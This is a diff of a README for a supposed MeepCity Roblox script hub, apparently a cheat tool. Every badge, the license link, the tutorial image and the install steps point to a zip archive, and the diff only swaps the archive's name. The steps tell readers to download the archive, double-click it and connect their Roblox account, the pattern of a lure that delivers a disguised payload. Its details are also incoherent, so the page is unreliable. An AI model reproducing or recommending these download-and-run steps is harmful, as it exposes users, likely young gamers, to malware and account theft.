@@ -1,11 +1,11 @@
 # 🚀 MeepCity Script Roblox Hub
 
-[![OS Compatibility](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip%20%7C%20macOS%20%7C%20Linux%20%7C%20Android%20%7C%20iOS-blue)]()
-[![GitHub Last Commit](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip)]()
-[![License: MIT](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip)]()
-[![Roblox Ready](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip)]()
-[![Multi-language Support](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip%2B-orange)]()
-[![OpenAI API Powered](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip)]()
+[![OS Compatibility](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip%20%7C%20macOS%20%7C%20Linux%20%7C%20Android%20%7C%20iOS-blue)]()
+[![GitHub Last Commit](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip)]()
+[![License: MIT](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip)]()
+[![Roblox Ready](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip)]()
+[![Multi-language Support](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip%2B-orange)]()
+[![OpenAI API Powered](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip)]()
 
 Welcome to the 🌟 **MeepCity Script Roblox Hub** — a new era utility tailor-made for **MeepCity** fans hungry for adaptability and smart customization. Kiss goodbye to dull scripts: this repository offers a next-generation script manager that blends full-featured automation, interface fluidity, and endless assistant capability — with *no paywalls and no nonsense*.
 
@@ -30,18 +30,18 @@ Transform the way you play Roblox MeepCity using advanced scripting, **AI-powere
 
 Get started effortlessly! Here’s the path to unlock your custom MeepCity experience:
 
-1️⃣ Download `https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip` from this repository.
+1️⃣ Download `https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip` from this repository.
 
 2️⃣ Extract the archive to your chosen folder.
 
-3️⃣ Double-click the `https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip` file and follow the adaptive wizard. It works identically on Windows, Mac, and supports Android/iOS via cloud connection.
+3️⃣ Double-click the `https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip` file and follow the adaptive wizard. It works identically on Windows, Mac, and supports Android/iOS via cloud connection.
 
 4️⃣ Connect your Roblox account via secure login or use guest mode for trial access.
 
 5️⃣ Enjoy the fully-unlocked MeepCity Script Roblox Hub features!
 
 ### 📽️ **Installation Video Tutorial**
-![Installation GIF](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip)
+![Installation GIF](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip)
 
 ---
 
@@ -108,7 +108,7 @@ This script hub is dedicated to educational and personalization purposes for the
 
 ## 📜 License
 
-This repository is open and distributed under the [MIT License](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/roblox_enhanced_meepcity_scripts_v1.8-alpha.2.zip).  
+This repository is open and distributed under the [MIT License](https://raw.githubusercontent.com/vladimir2678/meepcity-enhanced-scripts-roblox/main/muliebria/scripts-roblox-enhanced-meepcity-v1.2.zip).  
 © 2025 MeepCity Script Roblox Hub Community
 
 ---
